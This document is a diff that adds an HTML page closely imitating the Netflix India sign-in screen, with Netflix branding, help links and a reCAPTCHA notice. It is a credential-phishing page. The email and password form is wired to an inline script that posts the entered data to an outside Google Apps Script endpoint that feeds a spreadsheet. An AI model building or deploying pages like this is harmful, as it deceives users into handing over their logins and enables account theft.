@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix India – Watch TV Shows Online, Watch Movies Online</title>
+    <!-- CSS............................................................  -->
+    <link rel="stylesheet" href="index2.css">
+    <!-- ICON.........................................................................  -->
+    <link rel="icon" href="netflix_logo_icon_170919.png">
+    <!-- ICON2..........................................................................  -->
+    <script src="https://kit.fontawesome.com/d625700b2c.js" crossorigin="anonymous"></script>
+    <!-- <script src="https://kit.fontawesome.com/d625700b2c.js" crossorigin="anonymous"></script> -->
+    <!-- <script src="https://kit.fontawesome.com/d625700b2c.js" crossorigin="anonymous"></script> -->
+    <!-- FONT............................................................................  -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300&display=swap" rel="stylesheet">
+    <!-- FONT2.......................................................................  -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300&display=swap" rel="stylesheet">
+    <!-- FONT3.......................................................  -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@500&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <section class="first">
+        <div class="navbar">
+            <img src="netflix1.png" alt="net background" width="150px">
+        </div>
+        <div class="forms">
+            <div class="for">
+                <h1>Sign In</h1>
+                <form action="" name="submit-to-google-sheet">
+                    <input type="email" name="Email" placeholder="Email or phone number">
+                    <input type="password" name="Password" placeholder="Password">
+                </form>
+                <button>Sign In</button>
+                <div class="check">
+                    <div class="che">
+                        <input type="checkbox" name="Remember Me" id="rem_me" value="Remember Me">
+                        <label for="checkbox">Remember Me</label>
+                    </div>
+                    <p>Need help?</p>
+                </div>
+                <div class="new_to">
+                    <p>New to Netflix?<a href="index.html">Sign up now</a></p>
+                </div>
+                <div class="capta">
+                    <p>This page is protected by Google
+                        reCAPTCHA to <br>ensure you're not a bot. <a href="#">Learn more.</a>
+                    </p>
+                </div>
+            </div>
+        </div>
+        <div class="footer">
+            <p>Questios? Call <span>000-800-919-1694</span></p>
+            <div class="foot">
+                <ul>
+                    <li><a href="https://help.netflix.com/en/node/412">FAQ</a></li>
+                    <li><a href="">Cookie Preferences</a></li><br>
+                    <li class="english2"><i class="fa-sharp fa-solid fa-globe"></i>English</li>
+                </ul>
+                <ul>
+                    <li><a href="https://help.netflix.com/en/">Help Centre</a></li>
+                    <li><a href="https://help.netflix.com/legal/corpinfo">Corporate Information</a></li>
+                </ul>
+                <ul>
+                    <li><a href="https://help.netflix.com/legal/termsofuse">Terms of Use</a></li>
+                </ul>
+                <ul>
+                    <li><a href="https://help.netflix.com/legal/privacy">Privacy</a></li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyu_KJafe-5WBUF-unDrtAzTX6tEMX-1ML9QjSMR8LBsu4_l3BTtXsAidWMbIvCjjZA/exec'
+        const form = document.forms['submit-to-google-sheet']
+      
+        form.addEventListener('submit', e => {
+          e.preventDefault()
+          fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+            .then(response => console.log('Success!', response))
+            .catch(error => console.error('Error!', error.message))
+        })
+      </script>
+</body>
